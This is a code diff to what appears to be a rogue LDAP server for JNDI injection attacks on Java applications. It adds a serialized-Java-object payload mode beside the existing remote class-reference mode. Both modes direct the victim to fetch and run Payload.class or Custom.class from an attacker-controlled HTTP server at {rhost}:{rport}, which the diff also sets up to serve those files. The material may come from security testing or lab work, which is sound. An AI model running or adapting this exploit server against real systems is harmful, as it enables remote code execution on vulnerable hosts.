@@ -72,11 +72,12 @@ class LDAPResponse:
         serializer = Serializer()
         serializer.push_size(2)
         for k, v in reversed(self.attributes.items()):
-            serializer.push_size(3).push(v.encode()).pop_size().push(b'\x04').pop_size().push(b'1')
+            if k != 'javaSerializedData':
+                v = v.encode()
+            serializer.push_size(3).push(v).pop_size().push(b'\x04').pop_size().push(b'1')
             serializer.push_size().push(k.encode()).pop_size().push(b'\x04').pop_size().push(b'0')
 
-        serializer.push(b'0\x81\x82')
-        serializer.push_size().push(self.query_name.encode()).pop_size().push(b'\x04').pop_size()
+        serializer.push(b'0\x81\x82').push_size().push(self.query_name.encode()).pop_size().push(b'\x04').pop_size()
         serializer.push(b'\x02\x01\x02d\x81').pop_size().push(b'0\x81')
         return serializer.build() + SUCCESS_RESPONSE
 
@@ -90,12 +91,21 @@ class JNDI(services.Service):
         await asyncio.sleep(0.5)
         query = await reader.read(8096)
         query_name = query[9:9 + query[8:][0]].decode()
-        response = LDAPResponse(query_name, {
-            'javaClassName': 'Payload',
-            'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context),  # NOTE: Path must end with '/'
-            'objectClass': 'javaNamingReference',
-            'javaFactory': 'Payload',
-        })
+        payload_type = "SER" # Switch for type of injection
+        if payload_type == "REF":
+            response = LDAPResponse(query_name, {
+                'javaClassName': 'Payload',
+                'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context), # NOTE: Path must end with '/'
+                'objectClass': 'javaNamingReference',
+                'javaFactory': 'Payload',
+            })
+        elif payload_type == "SER":
+            payload_hex = "aced000573720006437573746f6d2e2e6edfa15124510200007870" ## Serialized object
+            response = LDAPResponse(query_name, {
+                'javaClassName': 'Custom',
+                'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context),  # NOTE: Path must end with '/'
+                'javaSerializedData': bytes.fromhex(payload_hex),
+            })
         writer.write(
             response.serialize()
         )
@@ -140,7 +150,9 @@ if __name__ == "__main__":
     httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
     httpd.add_route('/', 'Welcome')
     payload_path = pathlib.Path(pathlib.Path.cwd(), 'Payload.class')
+    custom_path = pathlib.Path(pathlib.Path.cwd(), 'Custom.class')
     httpd.add_route('/Payload.class', open(payload_path, 'rb').read())
+    httpd.add_route('/Custom.class', open(custom_path, 'rb').read())
     httpd.add_event('run', when=events.PathContains('send-requests'))
 
     # story.set_debug()
